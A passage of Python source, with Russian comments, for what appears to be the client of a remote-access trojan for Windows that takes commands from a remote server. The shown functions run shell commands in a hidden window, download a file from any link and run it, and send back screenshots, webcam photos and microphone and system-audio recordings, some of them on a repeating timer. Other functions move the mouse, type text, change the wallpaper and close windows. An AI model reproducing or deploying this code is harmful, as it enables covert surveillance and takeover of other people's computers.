        win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
        return f"🛑 Окно «{title}» отправлено на закрытие."
    except Exception as e:
        return f"❌ Ошибка закрытия: {e}"

# Эта функция будет выполняться в отдельном потоке
def _holdkey_task(keys, duration):
    try:
        # 1. Зажатие клавиш
        for key in keys:
            pyautogui.keyDown(key)
            
        # 2. Ожидание (этот поток блокируется, но не основной)
        time.sleep(duration)
        
        # 3. Отпускание клавиш
        for key in keys:
            pyautogui.keyUp(key)
    except Exception as e:
        # В фоновом потоке ошибку не отправить обратно, 
        # но лучше ее залогировать.
        logger.error(f"Ошибка в фоновом потоке _holdkey_task: {e}")

def cmd_holdkey(args):
    """
    Зажимает клавишу/клавиши на определенное время в фоновом режиме.
    Формат: /holdkey <секунды> <клавиша1> [клавиша2 ...]
    Пример: /holdkey 5 w
    """
    try:
        parts = args.split()
        if len(parts) < 2:
            return "❌ Формат: /holdkey <секунды> <клавиша1> [клавиша2 ...]"

        # 1. Получение времени
        try:
            duration = float(parts[0])
            if duration <= 0:
                return "❌ Время должно быть больше 0."
            duration = min(duration, 30.0)
        except ValueError:
            return "❌ Неверное значение времени (должно быть число)."

        # 2. Получение клавиш
        keys = [k.strip().lower() for k in parts[1:] if k.strip()]
        if not keys:
            return "❌ Укажите клавиши для зажатия."
        
        # 3. Запуск фонового потока (Non-blocking!)
        # daemon=True гарантирует, что поток закроется, когда закроется клиент.
        thread = threading.Thread(target=_holdkey_task, args=(keys, duration), daemon=True)
        thread.start()

        return f"✅ Клавиши `{', '.join(keys)}` зажаты на {duration} сек"

    except Exception as e:
        return f"❌ Ошибка при запуске: {e}"

def cmd_mousemove(args):
    if not args:
        return "❌ Укажите координаты X и Y."
    try:
        cordinates = args.strip().split()
        x = int(cordinates[0])
        y = int(cordinates[1])

        pyautogui.moveTo(x, y)
        return f'✅ Указатель мыши перемещен в {x}, {y}.'
    except (ValueError, IndexError):
        return "❌ Неверный формат координат. Используйте: X Y (целые числа)."
    except Exception as e:
        return f'❌ Ошибка: {e}'

def simulate_key_type(args):
    """Вводит текст целиком, без пробелов между символами."""
    if not args:
        return "Используйте: /keytype <текст>"
    
    try:
        # Используем keyboard.write() — он корректно вводит кириллицу и английский
        keyboard.write(args)
        # Опционально: имитируем "человеческий" ввод с задержкой
        # keyboard.write(args, delay=0.05)
        return f"Текст введён: {args}"
    except Exception as e:
        return f"Ошибка ввода: {e}"


def cmd_mouseclick(args):
    try:
        pyautogui.click()
        return '✅ Клик мыши выполнен.'
    except Exception as e:
        return f'❌ Ошибка: {e}'


def cmd_mousemesstart(args):
    global mouse_mess_thread
    if mouse_mess_thread and mouse_mess_thread.is_alive():
        return "⚠️ Хаос уже запущен."
    
    # Сбрасываем флаг, чтобы запустить цикл
    mouse_mess_stop_event.clear()
    
    # Создаем и запускаем новый поток в фоновом режиме (daemon=True)
    mouse_mess_thread = threading.Thread(target=mouse_mess_loop, daemon=True)
    mouse_mess_thread.start()
    
    return '✅ Хаос мыши запущен!'

def cmd_mousemesstop(args):
    global mouse_mess_thread
    if mouse_mess_thread and mouse_mess_thread.is_alive():
        # Устанавливаем флаг, чтобы остановить цикл
        mouse_mess_stop_event.set()
        # Ждем завершения потока (с таймаутом 2с)
        mouse_mess_thread.join(2) 
        mouse_mess_thread = None
        return '✅ Хаос мыши остановлен.'
    
    return '⚠️ Хаос мыши не был запущен.'

def cmd_wallpaper(args):
    logger.debug(f"Выполняется /wallpaper с аргументами: {args}")
    try:
        path_arg = args.strip()
        if not path_arg:
            return "❌ Укажите путь"
        path = path_arg if os.path.isabs(path_arg) else os.path.join(current_path, path_arg)
        path = os.path.abspath(path)
        if not os.path.isfile(path):
            return "❌ Файл не найден"
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
        return "✅ Обои изменены"
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"

def cmd_playsound(args, conn):
    """
    Проверяет файл, инициализирует микшер и запускает play_sound_task 
    в отдельном потоке.
    """
    global music_thread
    
    if not args:
        return "❌ Укажите путь к аудиофайлу."
        
    full_path = os.path.join(current_path, args.strip())
    
    if not os.path.isfile(full_path):
        return f"❌ Файл не найден: '{args.strip()}'"

    # Инициализация микшера Pygame (уже есть в client.py)
    if not initialize_mixer():
        return "❌ Не удалось инициализировать аудио-микшер Pygame."
        
    # Если музыка уже играет, останавливаем ее перед запуском новой
    if music_thread and music_thread.is_alive():
        music_stop_event.set()
        music_thread.join(timeout=1)
        music_stop_event.clear() 

    # Сброс флага и запуск в отдельном потоке (play_sound_task сам отправляет ответ)
    music_stop_event.clear()
    music_thread = threading.Thread(target=play_sound_task, args=(conn, full_path), daemon=True)
    music_thread.start()
    
    # Возвращаем None, чтобы основной цикл не отправлял ответ "Принято"
    return None 


def cmd_stopsound(args):
    """
    Останавливает воспроизведение аудиофайла.
    """
    global music_thread

    if music_thread and music_thread.is_alive():
        music_stop_event.set()
        # Дадим потоку время на завершение
        music_thread.join(timeout=1)
        music_thread = None
        return "✅ Воспроизведение остановлено."
    
    return "⚠️ Воспроизведение не запущено."

def cmd_volumeplus(args):
    logger.debug(f"Выполняется /volumeplus с аргументами: {args}")
    try:
        steps = int(args.strip()) if args.strip().isdigit() else 5
        steps = min(max(steps, 1), 50)
        for _ in range(steps):
            pyautogui.press('volumeup')
            time.sleep(0.05)
        return f"✅ Громкость +{steps * 2}%"
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"

def cmd_volumeminus(args):
    logger.debug(f"Выполняется /volumeminus с аргументами: {args}")
    try:
        steps = int(args.strip()) if args.strip().isdigit() else 5
        steps = min(max(steps, 1), 50)
        for _ in range(steps):
            pyautogui.press('volumedown')
            time.sleep(0.05)
        return f"✅ Громкость -{steps * 2}%"
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"


def cmd_download_link(args: str):
    """
    Запускает скачивание в отдельном потоке и сразу возвращает None.
    Главный цикл НЕ будет отправлять «Принято».
    """
    # берём текущий сокет (защищённый lock-ом)
    with socket_lock:
        conn = current_socket

    if not conn:
        return "Ошибка Нет соединения."

    # стартуем поток
    threading.Thread(
        target=download_link_worker,
        args=(args, conn),
        daemon=True,
    ).start()

    # ВАЖНО: возвращаем None → главный цикл пропустит send_response
    return None

def cmd_ping(args):
    """
    Просто возвращает статус, используется для Heartbeat.
    """
    return "alive" # Можно возвращать любую строку

def client_heartbeat_loop():
    """
    Регулярно отправляет команду /ping на Сервер, используя текущий сокет.
    """
    logger.info("Запущен Heartbeat-поток.")
    while not hb_stop_event.is_set():
        # Используем глобальный сокет, защищенный локом
        with socket_lock:
            conn = current_socket
        
        if conn:
            try:
                # Отправляем /ping в JSON-формате
                payload = json.dumps({"command": "/ping"}).encode('utf-8') + b'\n'
                conn.sendall(payload)
                logger.debug("Heartbeat /ping отправлен.")
            except Exception as e:
                # Если отправить не удалось, значит, сокет умер или в плохом состоянии.
                # Главный цикл main_client_loop скоро это обнаружит и переподключится.
                logger.warning(f"Ошибка Heartbeat: {e}")
                # Выходим, чтобы не спамить ошибками, пока не произойдет переподключение
                hb_stop_event.set() 
                break 

        # Ждем 10 секунд или до сигнала остановки
        hb_stop_event.wait(HB_INTERVAL)
        
    logger.info("Heartbeat-поток остановлен.")

def cmd_sysinfo(args):
    logger.debug(f"Выполняется /sysinfo с аргументами: {args}")
    try:
        info = {
            "OS": f"Windows {os.sys.platform}",
            "CPU": f"{psutil.cpu_percent(interval=0.5)}%",
            "RAM": f"{psutil.virtual_memory().percent}%",
            "Disk": f"{psutil.disk_usage(current_path).percent}%"
        }
        return "\n".join(f"{k}: {v}" for k, v in info.items())
    except Exception as e:
        return f"❌ Ошибка: {str(e)}"


def cmd_run(args):
    global current_path 
    
    if not args:
        return "❌ Укажите имя файла для запуска."

    try:
        # Извлекаем имя файла (убираем кавычки/пробелы)
        file = args.strip('"\' ')
        
        # 1. Формируем полный путь
        full_path = os.path.join(current_path, file)
        
        # 2. Проверяем существование
        if not os.path.isfile(full_path):
            return f"❌ Файл не найден: {full_path}"

        # 3. Запуск файла (Универсальный и надежный способ для Windows)
        # Мы используем Popen, аналогично вашему os.popen('start "" "{path}"')
        
        # Windows: os.startfile или 'start' через shell
        if os.name == 'nt': 
            try:
                # Попытка использовать os.startfile (самый чистый способ)
                os.startfile(full_path)
            except AttributeError:
                # Если os.startfile недоступен, используем Popen с командой 'start'
                subprocess.Popen(f'start "" "{full_path}"', shell=True)
            except Exception as e:
                 # Если ошибка прав или другая проблема
                 return f'❌ Ошибка запуска (Win): {e}'
        else: 
            # Не-Windows (Unix-подобные): для общего случая
             subprocess.Popen(['xdg-open', full_path]) 

        return f'✅ Открыт: {file}'

    except Exception as e:
        logger.error(f"Ошибка при запуске файла: {e}")
        return f'❌ Ошибка при запуске: {e}'
    

def download_link_worker(args: str, conn: socket.socket):
    """
    Скачивает файл по ссылке, сохраняет в current_path,
    при необходимости запускает и отправляет результат.
    """
    # Внутренняя функция-обёртка для send_response (чтобы не тащить её в аргументы)
    def _send(msg: str):
        send_response(conn, msg, cmd_name="/download_link")

    try:
        parts = args.strip().split()
        if len(parts) < 1:
            _send("Ошибка Укажите ссылку.")
            return

        link = parts[0]
        download_only = len(parts) > 1 and parts[1] == '0'

        # ------------------- скачивание -------------------
        resp = requests.get(link, stream=True, timeout=120)   # таймаут побольше
        resp.raise_for_status()

        # имя файла из URL (или заголовка)
        filename = os.path.basename(link.split('?')[0]) or f"dl_{int(time.time())}.bin"
        save_path = os.path.join(current_path, filename)

        with file_lock:
            with open(save_path, "wb") as f:
                for chunk in resp.iter_content(chunk_size=8192):
                    if chunk:
                        f.write(chunk)

        # ------------------- запуск (если нужно) -------------------
        if not download_only:
            if os.name == "nt":
                os.startfile(save_path)
            else:
                subprocess.Popen(["xdg-open", save_path])

        _send(
            f"Файл загружен: `{filename}`"
            + ("" if download_only else " и запущен")
        )
    except requests.Timeout:
        _send("Ошибка Таймаут загрузки.")
    except requests.RequestException as e:
        _send(f"Ошибка загрузки: {e}")
    except Exception as e:
        _send(f"Ошибка Неизвестная ошибка: {e}")
        # удаляем недокачанный файл
        try:
            if "save_path" in locals() and os.path.exists(save_path):
                os.remove(save_path)
        except:
            pass
                   
def cmd_execute_worker(args: str, conn: socket.socket, send_response_func):
    """
    РАБОЧАЯ функция, которая выполняется в ОТДЕЛЬНОМ потоке.
    Она блокируется, но это безопасно, так как не блокирует основной цикл.
    Использует РАБОЧИЙ механизм отправки файлов (send_response с is_file=True).
    """
    TELEGRAM_TEXT_LIMIT = 4000
    
    # --- Внутренняя функция для отправки ответа ---
    def worker_send_response(message=None, is_error=False, is_file=False, file_path=None):
        # 🔥 Мы используем существующую функцию send_response (строка ~947) 
        # Она обрабатывает is_file=True и отправляет файл через /response_file, 
        # что является РАБОЧИМ механизмом.
        if is_error:
            logger.error(f"Ошибка в worker: {message}")
        
        # Если message=None, send_response сам генерирует сообщение об успехе (строка ~960)
        send_response_func(conn, message, cmd_name="/execute", is_file=is_file, file_path=file_path)
    
    try:
        # 1. Логика запуска GUI-команд (для немедленного ответа)
        is_gui_command = any(ext in args.lower() for ext in ['.exe', '.com', '.bat']) or any(app in args.lower() for app in ['mspaint', 'notepad', 'calc', 'explorer'])
        
        if os.name == 'nt' and is_gui_command:
            # Немедленно запускаем процесс, не ждем его.
            subprocess.Popen(
                args, 
                shell=True,
                creationflags=(subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
            )
            response = f"✅ GUI-приложение '{args}' запущено в фоновом режиме. Вывода не будет."
            worker_send_response(response)
            return # Выходим
        
        # 2. Логика для консольных команд (блокировка только в этом потоке)
        result = subprocess.run(
            args, 
            shell=True, 
            capture_output=True, 
            text=True, 
            encoding='cp866', 
            errors='replace',
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        # 3. Обработка вывода
        stdout = result.stdout.strip()
        stderr = result.stderr.strip()
        
        full_output = []
        if stdout:
            full_output.append("--- СТАНДАРТНЫЙ ВЫВОД (STDOUT) ---\n" + stdout)
        if stderr:
            full_output.append("--- ОШИБКИ (STDERR) ---\n" + stderr)
            
        final_text = "\n\n".join(full_output)
        
        if not final_text:
             response = f"Команда выполнена успешно, но вывод отсутствует (Код: {result.returncode})."
        else:
            response = final_text

        # 4. Проверка длины и отправка результата
        if len(response) > TELEGRAM_TEXT_LIMIT:
            # Сохраняем файл
            with tempfile.NamedTemporaryFile(mode='w', suffix='_execute.txt', delete=False, encoding='utf-8') as tmp:
                tmp.write(f"КОМАНДА: {args}\n" + "="*(len(args)+10) + "\n\n")
                tmp.write(response)
                temp_file_path = tmp.name
            
            # 🔥 Отправляем файл, используя рабочий механизм send_response
            worker_send_response(message=None, is_file=True, file_path=temp_file_path) 
            
        else:
            # Отправляем единственную строку-ответ
            worker_send_response(response)

    except Exception as e:
        worker_send_response(f"❌ Критическая ошибка выполнения команды: {e}", is_error=True)
        
def cmd_execute(args: str):
    """
    Обертка. Запускает worker в потоке и возвращает None, 
    чтобы главный цикл не отправлял ответ "Принято".
    """
    if not args:
        return "❌ Укажите команду для выполнения."
        
    # БЕЗОПАСНО получаем сокет и функции отправки
    with socket_lock:
        conn = current_socket
        response_func = send_response # Ваша функция отправки ответа
        
    if not conn:
        return "❌ Нет активного соединения. Команда не будет выполнена."
        
    # Запуск рабочей функции в отдельном потоке (НЕ БЛОКИРУЕТ ГЛАВНЫЙ ЦИКЛ)
    threading.Thread(
        target=cmd_execute_worker, 
        args=(args, conn, response_func), 
        daemon=True
    ).start()
    
    # КЛЮЧЕВОЙ МОМЕНТ: Возвращаем None.
    # Это говорит главному циклу: "Ответ будет отправлен в другом месте, ничего не делай."
    return None

# ====== Отправка файлов ======
def send_file(conn, file_path):
    """
    Отправляет файл на Сервер.
    """
    if not os.path.exists(file_path):
        return f"❌ Файл не найден: {file_path}"

    try:
        file_size = os.path.getsize(file_path)
        file_name = os.path.basename(file_path)

        # 1. Отправка заголовка (метаданных)
        header = json.dumps({
            "command": "/upload",
            "file_name": file_name,
            "file_size": file_size
        }).encode('utf-8') + b'\n' # ВАЖНО: \n в конце заголовка
        conn.sendall(header)

        # 2. Отправка бинарных данных
        with open(file_path, 'rb') as f:
            while True:
                bytes_read = f.read(8192)
                if not bytes_read:
                    break
                conn.sendall(bytes_read)
        
        return None # Успех

    except Exception as e:
        return f"❌ Ошибка при отправке файла: {str(e)}"

def send_response(conn, result, cmd_name="N/A", is_file=False, file_path=None):
    global current_thread_id 
    
    thread_id_to_send = current_thread_id if current_thread_id is not None else 0 

    try:
        # === Вариант: отправляем файл ===
        if is_file and file_path and os.path.exists(file_path):
            file_size = os.path.getsize(file_path)
            file_name = os.path.basename(file_path)

            # 1. Отправляем JSON заголовок
            header = json.dumps({
                "thread_id": thread_id_to_send,
                "command": "/response_file",
                "file_name": file_name,
                "file_size": file_size,
                "result": f"Файл результата команды {cmd_name} отправлен."
            }).encode('utf-8') + b'\n'

            conn.sendall(header)

            # 2. Отправляем бинарные данные файла
            with open(file_path, 'rb') as f:
                while True:
                    chunk = f.read(8192)
                    if not chunk:
                        break
                    conn.sendall(chunk)

            # 3. Удаляем временный файл
            os.remove(file_path)
            return

        # === Вариант: обычный текстовый ответ ===
        response_data = {
            "thread_id": thread_id_to_send,
            "command": cmd_name,
            "result": str(result)
        }
        response = json.dumps(response_data).encode('utf-8') + b'\n'
        conn.sendall(response)

    except Exception as e:
        logger.error(f"Ошибка отправки ответа/файла: {e}")

# ====== Скриншоты и фото (Добавлен ответ) ======
def cmd_screenshot(args, conn):
    logger.debug(f"Выполняется /screenshot с аргументами: {args}")
    temp_path = None
    
    # 1. Используем tempfile для безопасного создания временного файла
    # Используем .png, так как cv2.imencode сжимает его в память
    temp_path = os.path.join(os.environ['TEMP'], f'{uuid.uuid4()}.jpg') 
    # Используем уникальное имя, чтобы избежать конфликтов
    
    try:
        # --- БЛОК ЗАХВАТА ЭКРАНА С ПОМОЩЬЮ MSS ---
        with mss.mss() as sct:
            # 1. Захват основного монитора (индекс 1 соответствует первому монитору)
            # Если нужно захватывать ВСЕ мониторы, нужно перебрать их
            monitor = sct.monitors[1]
            sct_img = sct.grab(monitor)
            
            # 2. Преобразование захваченного изображения mss (BGRA) в массив OpenCV (BGR)
            img_array = np.array(sct_img, dtype=np.uint8)
            # mss возвращает 4 канала (BGRA), cv2.imwrite лучше работает с 3 каналами (BGR)
            image = cv2.cvtColor(img_array, cv2.COLOR_BGRA2BGR)
            
        # --- ОПТИМИЗАЦИЯ И СОХРАНЕНИЕ ---
        # Сразу сохраняем с нужным качеством JPEG (95)
        success = cv2.imwrite(temp_path, image, [int(cv2.IMWRITE_JPEG_QUALITY), 95])

        if not success or os.path.getsize(temp_path) < 1024:
            # Проверка размера на случай, если скриншот вышел очень маленький
            send_response(conn, "❌ Не удалось сделать или сохранить скриншот (файл мал).")
            return

        # --- ОТПРАВКА ---
        error = send_file(conn, temp_path)
        send_response(conn, error or "✅ Скриншот отправлен")
        return None
        
    except Exception as e:
        send_response(conn, f"❌ Скриншот: {str(e)}")
        return None
        
    finally:
        # Очистка временного файла
        if temp_path and os.path.exists(temp_path):
            os.remove(temp_path)

def cmd_screenshot_full(args, conn):
    import win32gui, win32ui, win32con, win32api
    import ctypes, os, uuid, tempfile
    from PIL import Image

    temp_path = os.path.join(
        tempfile.gettempdir(),
        f"screen_full_{uuid.uuid4().hex}.png"
    )

    try:
        # ===== DPI =====
        try:
            ctypes.windll.shcore.SetProcessDpiAwareness(1)
        except Exception:
            ctypes.windll.user32.SetProcessDPIAware()

        # ===== ВИРТУАЛЬНЫЙ ЭКРАН (ВСЕ МОНИТОРЫ) =====
        width  = win32api.GetSystemMetrics(win32con.SM_CXVIRTUALSCREEN)
        height = win32api.GetSystemMetrics(win32con.SM_CYVIRTUALSCREEN)
        left   = win32api.GetSystemMetrics(win32con.SM_XVIRTUALSCREEN)
        top    = win32api.GetSystemMetrics(win32con.SM_YVIRTUALSCREEN)

        hdesktop = win32gui.GetDesktopWindow()
        desktop_dc = win32gui.GetWindowDC(hdesktop)
        img_dc = win32ui.CreateDCFromHandle(desktop_dc)
        mem_dc = img_dc.CreateCompatibleDC()

        bmp = win32ui.CreateBitmap()
        bmp.CreateCompatibleBitmap(img_dc, width, height)
        mem_dc.SelectObject(bmp)

        mem_dc.BitBlt(
            (0, 0),
            (width, height),
            img_dc,
            (left, top),
            win32con.SRCCOPY
        )

        # ===== КУРСОР =====
        flags, hcursor, (cx, cy) = win32gui.GetCursorInfo()
        if flags == win32con.CURSOR_SHOWING:
            info = win32gui.GetIconInfo(hcursor)
            win32gui.DrawIconEx(
                mem_dc.GetSafeHdc(),
                cx - left - info[1],
                cy - top - info[2],
                hcursor,
                0, 0, 0,
                None,
                win32con.DI_NORMAL
            )

        # ===== В PIL =====
        bmp_info = bmp.GetInfo()
        bmp_bits = bmp.GetBitmapBits(True)

        img = Image.frombuffer(
            "RGB",
            (bmp_info["bmWidth"], bmp_info["bmHeight"]),
            bmp_bits,
            "raw",
            "BGRX",
            0, 1
        )
        img.save(temp_path)

        # ===== CLEAN DC =====
        mem_dc.DeleteDC()
        win32gui.ReleaseDC(hdesktop, desktop_dc)

        if not os.path.exists(temp_path) or os.path.getsize(temp_path) < 1024:
            send_response(conn, "❌ Скриншот не получен")
            return None

        err = send_file(conn, temp_path)
        send_response(conn, err or "✅ Полный скриншот (все мониторы) отправлен")

    except Exception as e:
        send_response(conn, f"❌ Screenshot full error: {e}")

    finally:
        if os.path.exists(temp_path):
            try:
                os.remove(temp_path)
            except:
                pass

    return None

def find_available_cameras():
    """
    Пытается найти доступные камеры, используя простой вызов, 
    чтобы избежать конфликтов с бэкэндами.
    """
    index = 0
    available_cameras = 0
    # Проверяем до 10 индексов
    while index < 10: 
        cap = cv2.VideoCapture(index) 
        if cap.isOpened():
            available_cameras += 1
            cap.release()
        else:
            # Эвристика: если 3 последовательных индекса недоступны, останавливаем поиск.
            if available_cameras > 0 and index - available_cameras >= 3:
                 break
        index += 1
    return available_cameras

def cmd_photo(args, conn):
    """
    Делает снимок с веб-камеры по указанному индексу (по умолчанию 0). 
    Если индекс не указан, возвращает список доступных камер.
    """
    logger.debug(f"Выполняется /photo с аргументами: {args}")
    temp_path = None
    
    # 1. ОПРЕДЕЛЕНИЕ ИНДЕКСА КАМЕРЫ ИЛИ ВЫВОД СПИСКА
    camera_index = 0 # По умолчанию
    is_index_specified = False
    
    if args.isdigit():
        camera_index = int(args)
        is_index_specified = True
    elif args.strip():
        send_response(conn, "❌ /photo: Индекс камеры должен быть числом.")
        return

    # Если аргументы не указаны, показываем доступные камеры
    if not is_index_specified:
        num_cams = find_available_cameras()
        if num_cams == 0:
            send_response(conn, "❌ Веб-камеры не найдены.")
        else:
            # Сообщение с явным указанием индексов, доступных для использования
            send_response(conn, f"✅ Найдено {num_cams} камер (индексы 0 - {num_cams-1}). Используйте /photo <индекс>.")
        return

    try:
        # 2. ЗАХВАТ ИЗОБРАЖЕНИЯ С ВЫБРАННОГО ИНДЕКСА
        # 🔥 Используем простой вызов cv2.VideoCapture(index), который работал
        cap = cv2.VideoCapture(camera_index)
        
        if not cap.isOpened():
            send_response(conn, f"❌ Камера с индексом {camera_index} недоступна. Попробуйте другой индекс.")
            return

        ret = False
        frame = None
        # Прогрев и захват (ваш рабочий код)
        for _ in range(10):
            ret, frame = cap.read()
            if ret:
                break
            time.sleep(0.2)
            
        cap.release()

        if not ret or frame is None:
            send_response(conn, "❌ Не удалось получить изображение.")
            return

        # 3. Сохранение, проверка размера и отправка
        temp_path = os.path.join(os.environ['TEMP'], f'webcam_{int(time.time())}.jpg')
        cv2.imwrite(temp_path, frame, [int(cv2.IMWRITE_JPEG_QUALITY), 80])

        if os.path.getsize(temp_path) < 1024:
            os.remove(temp_path)
            send_response(conn, "❌ Изображение слишком маленькое")
            return

        error = send_file(conn, temp_path)
        
        send_response(conn, error or f"✅ Фото с камеры {camera_index} отправлено")
        
    except Exception as e:
        send_response(conn, f"❌ Фото (Критическая ошибка): {str(e)}")
    finally:
        if temp_path and os.path.exists(temp_path):
            try:
                os.remove(temp_path)
            except Exception as e:
                logger.error(f"Не удалось удалить временный файл: {e}")

# ====== Auto (Запускается в отдельном потоке) ======
def auto_job(interval, capture_screen, capture_webcam, camera_index):
    # Эта функция выполняется в отдельном потоке
    while not stop_event.wait(interval):
        try:
            # Сокет должен быть доступен только для записи в этом потоке
            conn = current_socket 
            if conn and conn.fileno() != -1:
                if capture_screen:
                    # Вызываем функции, которые сами обрабатывают сокет через socket_lock
                    cmd_screenshot("", conn)
                if capture_webcam:
                    cmd_photo(str(camera_index), conn)
        except Exception as e:
            logger.error(f"Auto ошибка: {e}")
            time.sleep(1)

def cmd_auto(args, conn):
    global auto_thread
    logger.debug(f"Выполняется /auto с аргументами: {args}")
    try:
        parts = args.split()
        if not parts:
            return "❌ /auto <сек> [screen|webcam|both] [camera_index]"
        
        interval = float(parts[0])
        if interval <= 0:
            return "❌ Интервал > 0"

        # режим: screen / webcam / both
        mode = parts[1].lower() if len(parts) > 1 else "both"
        capture_screen = "screen" in mode or "both" in mode
        capture_webcam = "webcam" in mode or "both" in mode

        # индекс камеры (если есть)
        camera_index = 0
        if len(parts) > 2:
            if parts[2].isdigit():
                camera_index = int(parts[2])
            else:
                return "❌ Индекс камеры должен быть числом."

        if auto_thread and auto_thread.is_alive():
            return "❌ Уже запущено (/stop)"

        stop_event.clear()
        auto_thread = threading.Thread(
            target=auto_job,
            args=(interval, capture_screen, capture_webcam, camera_index),
            daemon=True
        )
        auto_thread.start()
        return f"✅ Auto каждые {interval}с (камера {camera_index})"

    except Exception as e:
        return f"❌ {str(e)}"


def cmd_stop(args):
    global auto_thread
    if auto_thread and auto_thread.is_alive():
        stop_event.set()
        auto_thread.join(timeout=5)
        auto_thread = None
        return "✅ Auto остановлено"
    return "❌ Auto не запущено"

# ====== Команды для записи (Аудио-Видеозапись) ======

def cmd_mic(args, conn):
    """
    Records audio for a specified duration and sends the WAV file.
    Usage: /mic [seconds] (Default 5s, Max 30s)
    """
    logger.debug(f"Выполняется /mic с аргументами: {args}")
    WAVE_OUTPUT_FILENAME = None
    
    try:
        record_time = 5
        if args.strip().isdigit():
            # Ограничиваем время записи 1-30 секундами
            record_time = max(1, min(30, int(args.strip()))) 

        # 1. Настройки
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        CHANNELS = 1 # Используем 1 канал для лучшей совместимости
        RATE = 44100
        
        temp_dir = tempfile.gettempdir()
        WAVE_OUTPUT_FILENAME = os.path.join(temp_dir, f"mic_rec_{int(time.time())}.wav")

        p = pyaudio.PyAudio()
        send_response(conn, f"✅ Начата запись аудио на {record_time} секунд...")

        # 2. Запись
        stream = p.open(format=FORMAT,
                         channels=CHANNELS,
                         rate=RATE,
                         input=True,
                         frames_per_buffer=CHUNK)

        frames = []
        num_frames = int(RATE / CHUNK * record_time)
        
        for i in range(0, num_frames):
            # exception_on_overflow=False предотвращает сбой при переполнении буфера
            data = stream.read(CHUNK, exception_on_overflow=False) 
            frames.append(data)

        # 3. Остановка
        stream.stop_stream()
        stream.close()
        p.terminate()

        # 4. Сохранение в WAV
        with wave.open(WAVE_OUTPUT_FILENAME, 'wb') as wf:
            wf.setnchannels(CHANNELS)
            wf.setsampwidth(p.get_sample_size(FORMAT))
            wf.setframerate(RATE)
            wf.writeframes(b''.join(frames))
            
        # 5. Отправка
        error = send_file(conn, WAVE_OUTPUT_FILENAME)
        send_response(conn, error or f"✅ Аудио отправлено ({record_time}с)")

    except Exception as e:
        send_response(conn, f"❌ Микрофон (Критическая ошибка): {str(e)}")
    finally:
        if WAVE_OUTPUT_FILENAME and os.path.exists(WAVE_OUTPUT_FILENAME):
            os.remove(WAVE_OUTPUT_FILENAME)


def find_wasapi_device():
    """
    Находит наиболее подходящее устройство WASAPI для Loopback записи.
    Пробует: 1) Дефолтный ВЫХОД, 2) Дефолтный ВХОД, 3) Любой WASAPI-инпут.
    Возвращает (index, default_samplerate, max_input_channels) или None.
    """
    
    api_list = sd.query_hostapis()
    wasapi_index = None
    for i, api in enumerate(api_list):
        if api["name"].lower().startswith("windows wasapi"):
            wasapi_index = i
            break

    if wasapi_index is None:
        return None 

    # --- Вспомогательная функция для проверки и возврата ---
    def check_and_return(device_index):
        if device_index is None:
            return None
        try:
            dev = sd.query_devices(device_index)
            if dev["hostapi"] == wasapi_index and dev["max_input_channels"] > 0:
                # ВОЗВРАЩАЕМ ТРИ ЗНАЧЕНИЯ: индекс, частоту, каналы
                return dev["index"], dev["default_samplerate"], dev["max_input_channels"] 
        except Exception:
            pass
        return None

    # --- Попытка 1: Дефолтный ВЫХОД ---
    try:
        default_output_index = sd.default.device[1] 
        result = check_and_return(default_output_index)
        if result:
            return result
    except Exception:
        pass

    # --- Попытка 2: Дефолтный ВХОД ---
    try:
        default_input_index = sd.default.device[0] 
        result = check_and_return(default_input_index)
        if result:
            return result
    except Exception:
        pass
        
    # --- Попытка 3: Любое WASAPI устройство ---
    for dev in sd.query_devices():
        if dev["hostapi"] == wasapi_index:
            if dev["max_input_channels"] > 0:
                return dev["index"], dev["default_samplerate"], dev["max_input_channels"]

    return None

def cmd_audiorecord(args, conn):
    """
    /recordaudio <секунды>
    Записывает системный звук (WASAPI loopback) и отправляет WAV-файл.
    
    Ограничение: 1–60 секунд.
    """

    logger.debug(f"Выполняется /recordaudio с аргументами: {args}")

    # 💡 Инициализируем контейнер для параметров устройства.
    audio_path = None
    device_params = {}  
    # Инициализируем переменные, которые будут использоваться
    samplerate = 44100
    channels_to_use = 2 
    dtype = 'int16'
    
    # ------------------------------------------------------------------
    # Присваиваем значения по умолчанию, которые будут перезаписаны
    device_params['index'] = None
    device_params['samplerate'] = samplerate
    device_params['max_input_channels'] = channels_to_use 
    # ------------------------------------------------------------------

    try:
        # ---- Аргументы ----
        if not args.strip().isdigit():
            send_response(conn, "❌ Формат: /recordaudio <секунды>")
            return

        duration = max(1, min(60, int(args.strip())))
        
        # ----------------------------------------------------------
        # 1. Поиск WASAPI loopback устройства
        # ----------------------------------------------------------
        # Предполагаем, что find_wasapi_device теперь возвращает 3 значения!
        device_info = find_wasapi_device() 

        if device_info is None:
            send_response(conn,
                "❌ Системный звук записать невозможно: WASAPI loopback-устройство не найдено.\n"
                "Требуется Windows и активное аудиоустройство, поддерживающее Loopback."
            )
            return

        # 💡 СОХРАНЯЕМ И РАСПАКОВЫВАЕМ ТРИ ЗНАЧЕНИЯ:
        device_params['index'] = device_info[0]
        device_params['samplerate'] = device_info[1]
        device_params['max_input_channels'] = device_info[2] 
        
        # Адаптируем каналы: используем 2 канала, НО не больше, чем позволяет устройство.
        channels_to_use = min(2, device_params['max_input_channels'])
        samplerate = device_params['samplerate'] # Используем локальную переменную для краткости в расчетах

        # ----------------------------------------------------------
        # 2. Путь к файлу
        # ----------------------------------------------------------
        temp_dir = tempfile.gettempdir()
        audio_path = os.path.join(temp_dir, f"audio_{int(time.time())}.wav")

        send_response(conn, f"🎧 Запись системного звука на {duration} секунд (Частота: {samplerate} Гц, Каналы: {channels_to_use})...")

        # ----------------------------------------------------------
        # 3. Запись 
        # ----------------------------------------------------------
        
        # Устанавливаем устройство, обращаясь к контейнеру
        sd.default.device = device_params['index']  
        sd.default.dtype = dtype

        recording = sd.rec(
            int(duration * samplerate),
            samplerate=samplerate,
            channels=channels_to_use, # <-- ИСПОЛЬЗУЕМ АДАПТИВНЫЕ КАНАЛЫ
            dtype=dtype,
            blocking=False
        )

        sd.wait() # Ждем завершения записи

        # ----------------------------------------------------------
        # 4. Сохранение WAV
        # ----------------------------------------------------------
        with wave.open(audio_path, 'wb') as wf:
